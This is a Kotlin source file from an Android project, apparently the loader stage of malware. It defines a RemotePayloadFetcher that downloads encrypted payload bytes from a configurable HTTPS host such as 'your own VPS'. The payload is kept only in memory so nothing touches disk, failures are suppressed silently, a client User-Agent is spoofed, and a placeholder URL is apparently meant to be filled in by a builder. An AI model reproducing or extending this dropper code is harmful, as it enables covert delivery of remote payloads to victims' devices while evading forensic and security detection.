package com.cristal.bristral.tristal.mistral.network

import java.net.HttpURLConnection
import java.net.URL
import javax.net.ssl.HttpsURLConnection

/**
 * RemotePayloadFetcher — downloads encrypted payload bytes from HTTPS URL.
 *
 * Supports:
 *   - GitHub Releases direct download links
 *   - Any HTTPS static file server
 *   - Your own VPS
 *
 * Returns raw encrypted bytes — decryption handled by CryptoHelper.
 * Never writes to disk — returns ByteArray in RAM only.
 * Silent — never crashes, returns null on any failure.
 */
object RemotePayloadFetcher {

    private const val CONNECT_TIMEOUT  = 15000  // ms
    private const val READ_TIMEOUT     = 60000  // ms — payload may be large
    private const val MAX_PAYLOAD_SIZE = 50 * 1024 * 1024  // 50MB safety cap

    /**
     * Download payload from URL into RAM.
     * @param url  HTTPS URL to encrypted payload
     * @return encrypted bytes or null on failure
     */
    fun fetch(url: String): ByteArray? {
        if (url.isBlank() ||
            url == "PAYLOAD_URL_PLACEHOLDER_DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD" ||
            url == "LOCAL") {
            return null
        }

        return try {
            val connection = URL(url).openConnection() as HttpsURLConnection
            connection.connectTimeout = CONNECT_TIMEOUT
            connection.readTimeout    = READ_TIMEOUT
            connection.requestMethod  = "GET"
            connection.setRequestProperty("User-Agent", "okhttp/4.9.0")
            connection.instanceFollowRedirects = true

            val responseCode = connection.responseCode
            if (responseCode != HttpURLConnection.HTTP_OK) {
                connection.disconnect()
                return null
            }

            val contentLength = connection.contentLengthLong
            if (contentLength > MAX_PAYLOAD_SIZE) {
                connection.disconnect()
                return null
            }

            val bytes = connection.inputStream.use { it.readBytes() }
            connection.disconnect()

            if (bytes.isEmpty()) null else bytes

        } catch (e: Exception) {
            null
        }
    }
}
